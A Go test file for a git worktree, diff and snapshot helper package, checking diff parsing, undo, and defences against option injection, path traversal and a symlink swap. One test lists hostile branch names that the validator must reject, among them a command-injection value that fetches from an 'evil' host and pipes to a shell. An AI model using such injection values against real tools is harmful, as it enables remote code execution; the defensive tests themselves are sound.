package gitx

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestNormalizeURL(t *testing.T) {
	cases := map[string]string{
		"git@github.com:Me/App.git":                 "github.com/me/app",
		"https://github.com/me/app":                 "github.com/me/app",
		"https://user@github.com/me/app.git/":       "github.com/me/app",
		"ssh://git@gitlab.example.com:2222/g/r.git": "gitlab.example.com/g/r",
		"": "",
	}
	for in, want := range cases {
		if got := NormalizeURL(in); got != want {
			t.Errorf("NormalizeURL(%q) = %q, want %q", in, got, want)
		}
	}
}

const sample = `diff --git a/src/api.ts b/src/api.ts
index 111..222 100644
--- a/src/api.ts
+++ b/src/api.ts
@@ -82,3 +82,4 @@ export function x() {
   const query = parseQuery(req)
-  return csvString(rows)
+  const rows = streamRows(query)
+  return pipe(streamCsv(rows), res)
 }
diff --git a/new.txt b/new.txt
new file mode 100644
index 0000000..e69de29
--- /dev/null
+++ b/new.txt
@@ -0,0 +1 @@
+hello
`

func TestParseDiff(t *testing.T) {
	files := ParseDiff(sample)
	if len(files) != 2 {
		t.Fatalf("files = %d", len(files))
	}
	f := files[0]
	if f.Path != "src/api.ts" || f.Status != "M" || f.Added != 2 || f.Deleted != 1 {
		t.Fatalf("bad file: %+v", f)
	}
	h := f.Hunks[0]
	if h.OldStart != 82 || h.NewStart != 82 || len(h.Lines) != 5 {
		t.Fatalf("bad hunk: %+v", h)
	}
	if h.Lines[2].Kind != "+" || h.Lines[2].New != 83 || h.Lines[1].Old != 83 {
		t.Fatalf("line numbers: %+v", h.Lines)
	}
	if files[1].Status != "A" || files[1].Path != "new.txt" {
		t.Fatalf("new file: %+v", files[1])
	}
}

func TestHunkIDSurvivesLineShift(t *testing.T) {
	a := ParseDiff(sample)[0].Hunks[0]
	shifted := strings.Replace(sample, "@@ -82,3 +82,4 @@", "@@ -90,3 +90,4 @@", 1)
	b := ParseDiff(shifted)[0].Hunks[0]
	if a.ID != b.ID {
		t.Fatalf("hunk id changed with line numbers: %s vs %s", a.ID, b.ID)
	}
	changed := strings.Replace(sample, "+  const rows = streamRows(query)", "+  const rows = other()", 1)
	c := ParseDiff(changed)[0].Hunks[0]
	if a.ID == c.ID {
		t.Fatal("hunk id must change with content")
	}
}

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %s", args, out)
	}
	return strings.TrimSpace(string(out))
}

func TestSnapshotAndRestore(t *testing.T) {
	dir := t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(dir, "a.txt"), []byte("one\n"), 0o644)
	os.WriteFile(filepath.Join(dir, ".gitignore"), []byte("ignored\n"), 0o644)
	git(t, dir, "add", ".")
	git(t, dir, "commit", "-qm", "init")

	os.WriteFile(filepath.Join(dir, "a.txt"), []byte("two\n"), 0o644)
	os.WriteFile(filepath.Join(dir, "ignored"), []byte("x"), 0o644)
	sha, err := SnapshotCommit(dir, "snap")
	if err != nil {
		t.Fatal(err)
	}
	if err := UpdateRef(dir, "refs/pekoe/s/prompt-1", sha); err != nil {
		t.Fatal(err)
	}
	// the real index and branch are untouched
	if st := git(t, dir, "status", "--porcelain"); st != "M a.txt" { // unstaged only (leading space trimmed)
		t.Fatalf("index changed: %q", st)
	}
	if log := git(t, dir, "log", "--oneline"); strings.Contains(log, "snap") {
		t.Fatal("snapshot visible in git log")
	}
	if ShowFile(dir, sha, "ignored") != "" {
		t.Fatal("ignored file must not be snapshotted")
	}
	// later work, including a new file, then undo
	os.WriteFile(filepath.Join(dir, "a.txt"), []byte("three\n"), 0o644)
	os.WriteFile(filepath.Join(dir, "new.txt"), []byte("n\n"), 0o644)
	if err := RestoreSnapshot(dir, sha); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "a.txt"))
	if string(b) != "two\n" {
		t.Fatalf("a.txt = %q", b)
	}
	if _, err := os.Stat(filepath.Join(dir, "new.txt")); !os.IsNotExist(err) {
		t.Fatal("file added after the snapshot should be removed")
	}
	if _, err := os.Stat(filepath.Join(dir, "ignored")); err != nil {
		t.Fatal("ignored files must survive undo")
	}
}

func TestAddExclude(t *testing.T) {
	dir := t.TempDir()
	git(t, dir, "init", "-q")
	if err := AddExclude(dir, ".pekoe/"); err != nil {
		t.Fatal(err)
	}
	AddExclude(dir, ".pekoe/")
	b, _ := os.ReadFile(filepath.Join(dir, ".git", "info", "exclude"))
	if strings.Count(string(b), ".pekoe/") != 1 {
		t.Fatalf("exclude: %q", b)
	}
}

func TestCurrentBranch(t *testing.T) {
	dir := t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	// unborn: rev-parse --abbrev-ref HEAD would print "HEAD"
	if got := CurrentBranch(dir); got != "main" {
		t.Fatalf("unborn branch: got %q, want main", got)
	}
	os.WriteFile(filepath.Join(dir, "a.txt"), []byte("one\n"), 0o644)
	git(t, dir, "add", ".")
	git(t, dir, "commit", "-qm", "init")
	git(t, dir, "checkout", "-qb", "feat/x")
	if got := CurrentBranch(dir); got != "feat/x" {
		t.Fatalf("branch: got %q, want feat/x", got)
	}
	git(t, dir, "checkout", "-q", "--detach")
	if got := CurrentBranch(dir); got != "HEAD" {
		t.Fatalf("detached HEAD: got %q, want HEAD", got)
	}
}

func newRepo(t *testing.T, dir string) string {
	t.Helper()
	os.MkdirAll(dir, 0o755)
	git(t, dir, "init", "-q", "-b", "main")
	git(t, dir, "commit", "-q", "--allow-empty", "-m", "init")
	return dir
}

// Two repositories with the same name share ~/worktrees/<name>: a directory
// there is told apart by its common git directory.
func TestCheckWorktreeOf(t *testing.T) {
	a := newRepo(t, filepath.Join(t.TempDir(), "app"))
	b := newRepo(t, filepath.Join(t.TempDir(), "app"))
	wt := filepath.Join(t.TempDir(), "app", "feat-x")
	if err := AddWorktree(b, wt, "feat/x", "main"); err != nil {
		t.Fatal(err)
	}
	if err := CheckWorktreeOf(b, wt); err != nil {
		t.Fatalf("own worktree: %v", err)
	}
	if err := CheckWorktreeOf(a, wt); err != ErrForeignWorktree {
		t.Fatalf("other repository's worktree: %v", err)
	}
	sub := filepath.Join(wt, "sub")
	os.MkdirAll(sub, 0o755)
	if err := CheckWorktreeOf(b, sub); err != ErrNotWorktree {
		t.Fatalf("a directory inside a worktree: %v", err)
	}
	if err := CheckWorktreeOf(a, t.TempDir()); err != ErrNotWorktree {
		t.Fatalf("plain directory: %v", err)
	}
}

// A base that looks like an option is a ref to git, not an option.
func TestAddWorktreeBaseIsNotAnOption(t *testing.T) {
	r := newRepo(t, filepath.Join(t.TempDir(), "app"))
	wt := filepath.Join(t.TempDir(), "wt")
	if err := AddWorktree(r, wt, "nb", "--no-checkout"); err == nil {
		t.Fatal("--no-checkout was taken as an option")
	}
	if _, err := MergeBase(r, "--octopus", "HEAD"); err == nil {
		t.Fatal("merge-base took --octopus as an option")
	}
	if err := CheckRefArg("base", "--upload-pack=x"); err == nil {
		t.Fatal("CheckRefArg accepted a leading '-'")
	}
	if err := CheckRefArg("base", "origin/main"); err != nil {
		t.Fatal(err)
	}
}

// An origin whose last element is ".." (or empty) must not become the
// directory name under ~/worktrees: Join would climb out of it.
func TestRepoNameIsOnePathElement(t *testing.T) {
	dir := newRepo(t, filepath.Join(t.TempDir(), "app"))
	git(t, dir, "remote", "add", "origin", "x:y")
	for _, origin := range []string{"x:..", "https://github.com/a/..", "x:.", "https://github.com/a/../", "..", "x:a/..\\.."} {
		git(t, dir, "remote", "set-url", "origin", origin)
		n := RepoName(dir)
		if !pathElem(n) || n == ".." {
			t.Errorf("origin %q: RepoName = %q", origin, n)
		}
		id, err := RepoID(dir)
		if err != nil || !pathElem(id) {
			t.Errorf("origin %q: RepoID = %q, %v", origin, id, err)
		}
	}
	git(t, dir, "remote", "set-url", "origin", "git@github.com:me/tool.git")
	if n := RepoName(dir); n != "tool" {
		t.Fatalf("RepoName = %q, want tool", n)
	}
}

// Branch names go into [hooks] commands as {{branch}}: a name with shell
// characters is refused before anything is made; ordinary ones pass.
func TestCheckBranchName(t *testing.T) {
	for _, bad := range []string{
		"x$(curl${IFS}-s${IFS}evil|sh)", "x`id`", "a;b", "a|b", "a&b", "it's", `a"b`, `a\b`,
		"a b", "a\tb", "a\nb", "a(b", "a)b", "a{b}", "a<b", "a>b", "a*", "a?", "a[b]", "~a", "a!", "#a", "a\x00b", "a\x7fb", "a\u3000b",
		"-x", "",
	} {
		if bad == "" {
			continue
		}
		if err := CheckBranchName(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, ok := range []string{"feat/x", "fix/login-safari", "release/1.2", "feat/12-csv_export", "pr-12", "feat/issue-7-csv-export", "user@host", "日本語"} {
		if err := CheckBranchName(ok); err != nil {
			t.Errorf("%q refused: %v", ok, err)
		}
	}
}

// plainGit makes git run with its defaults (core.quotePath=true), not the
// developer's ~/.gitconfig, which may hide quoting bugs.
func plainGit(t *testing.T) {
	t.Setenv("GIT_CONFIG_GLOBAL", "/dev/null")
	t.Setenv("GIT_CONFIG_NOSYSTEM", "1")
}

// Paths with spaces, non-ASCII, tabs: git quotes them ("b/\346...") or puts
// a tab after them (+++ b/sp ace.txt\t); the review needs the real names.
func TestDiffOddPaths(t *testing.T) {
	plainGit(t)
	dir := t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(dir, "old 名前.txt"), []byte("same\nsame\nsame\nsame\n"), 0o644)
	os.WriteFile(filepath.Join(dir, "画像.bin"), []byte{0, 1, 2}, 0o644)
	git(t, dir, "add", ".")
	git(t, dir, "commit", "-qm", "init")
	base := git(t, dir, "rev-parse", "HEAD")

	names := []string{"sp ace.txt", "日本語.txt", "tab\tname.txt", `q"uote.txt`}
	for _, n := range names {
		os.WriteFile(filepath.Join(dir, n), []byte("hello\n"), 0o644)
	}
	os.WriteFile(filepath.Join(dir, "画像.bin"), []byte{0, 1, 3}, 0o644)
	git(t, dir, "mv", "old 名前.txt", "新 名前.txt")
	tree, err := SnapshotTree(dir)
	if err != nil {
		t.Fatal(err)
	}
	files, err := Diff(dir, base, tree)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]FileDiff{}
	for _, f := range files {
		got[f.Path] = f
	}
	for _, n := range names {
		f, ok := got[n]
		if !ok || f.Status != "A" {
			t.Errorf("%q: missing or not added; files: %q", n, keys(got))
			continue
		}
		if ShowFile(dir, tree, n) != "hello\n" {
			t.Errorf("%q: ShowFile empty", n)
		}
	}
	if f, ok := got["画像.bin"]; !ok || !f.Binary {
		t.Errorf("binary 画像.bin missing; files: %q", keys(got))
	}
	if f, ok := got["新 名前.txt"]; !ok || f.Status != "R" || f.OldPath != "old 名前.txt" {
		t.Errorf("rename: %+v; files: %q", f, keys(got))
	}
}

func keys(m map[string]FileDiff) []string {
	var k []string
	for p := range m {
		k = append(k, p)
	}
	return k
}

// undo removes files made after the snapshot, whatever their names.
func TestRestoreSnapshotOddNames(t *testing.T) {
	plainGit(t)
	dir := t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(dir, "a.txt"), []byte("one\n"), 0o644)
	git(t, dir, "add", ".")
	git(t, dir, "commit", "-qm", "init")
	sha, err := SnapshotCommit(dir, "snap")
	if err != nil {
		t.Fatal(err)
	}
	names := []string{"日本語.txt", "tab\tname.txt", "sp ace.txt"}
	for _, n := range names {
		os.WriteFile(filepath.Join(dir, n), []byte("x\n"), 0o644)
	}
	if err := RestoreSnapshot(dir, sha); err != nil {
		t.Fatal(err)
	}
	for _, n := range names {
		if _, err := os.Stat(filepath.Join(dir, n)); !os.IsNotExist(err) {
			t.Errorf("%q added after the snapshot survived undo", n)
		}
	}
}

// Quoted names as git prints them without core.quotePath=false.
func TestParseDiffQuoted(t *testing.T) {
	in := "diff --git \"a/\\346\\227\\245.txt\" \"b/\\346\\227\\245.txt\"\n" +
		"new file mode 100644\n--- /dev/null\n+++ \"b/\\346\\227\\245.txt\"\n@@ -0,0 +1 @@\n+x\n" +
		"diff --git \"a/\\347\\224\\273.bin\" \"b/\\347\\224\\273.bin\"\nBinary files \"a/\\347\\224\\273.bin\" and \"b/\\347\\224\\273.bin\" differ\n" +
		"diff --git a/sp ace.txt b/sp ace.txt\n--- a/sp ace.txt\t\n+++ b/sp ace.txt\t\n@@ -1 +1 @@\n-a\n+b\n"
	files := ParseDiff(in)
	want := []string{"日.txt", "画.bin", "sp ace.txt"}
	if len(files) != len(want) {
		t.Fatalf("files = %+v", files)
	}
	for i, w := range want {
		if files[i].Path != w {
			t.Errorf("file %d: path %q, want %q", i, files[i].Path, w)
		}
	}
}

// git puts a tab after a ---/+++ name containing a space.
func TestParseDiffSpaceInName(t *testing.T) {
	in := "diff --git a/sp ace.txt b/sp ace.txt\n--- a/sp ace.txt\t\n+++ b/sp ace.txt\t\n@@ -1 +1 @@\n-a\n+b\n"
	files := ParseDiff(in)
	if len(files) != 1 || files[0].Path != "sp ace.txt" {
		t.Fatalf("files = %+v", files)
	}
}

// The agent swaps a directory for a symlink out of the worktree between
// RestoreSnapshot's diff and its removes: the file outside stays.
func TestRestoreSnapshotDoesNotFollowSwappedSymlink(t *testing.T) {
	dir, outside := t.TempDir(), t.TempDir()
	git(t, dir, "init", "-q", "-b", "main")
	os.WriteFile(filepath.Join(dir, "k.txt"), []byte("k\n"), 0o644)
	git(t, dir, "add", ".")
	git(t, dir, "commit", "-qm", "init")
	sha, err := SnapshotCommit(dir, "snap")
	if err != nil {
		t.Fatal(err)
	}
	victim := filepath.Join(outside, ".zshrc")
	os.WriteFile(victim, []byte("keep me\n"), 0o644)
	os.Mkdir(filepath.Join(dir, "a"), 0o755)
	os.WriteFile(filepath.Join(dir, "a", ".zshrc"), []byte("added\n"), 0o644)
	beforeRemove = func() {
		os.RemoveAll(filepath.Join(dir, "a"))
		if err := os.Symlink(outside, filepath.Join(dir, "a")); err != nil {
			t.Error(err)
		}
	}
	t.Cleanup(func() { beforeRemove = nil })
	_ = RestoreSnapshot(dir, sha)
	if b, err := os.ReadFile(victim); err != nil || string(b) != "keep me\n" {
		t.Fatalf("file outside the worktree: %q, %v", b, err)
	}
}
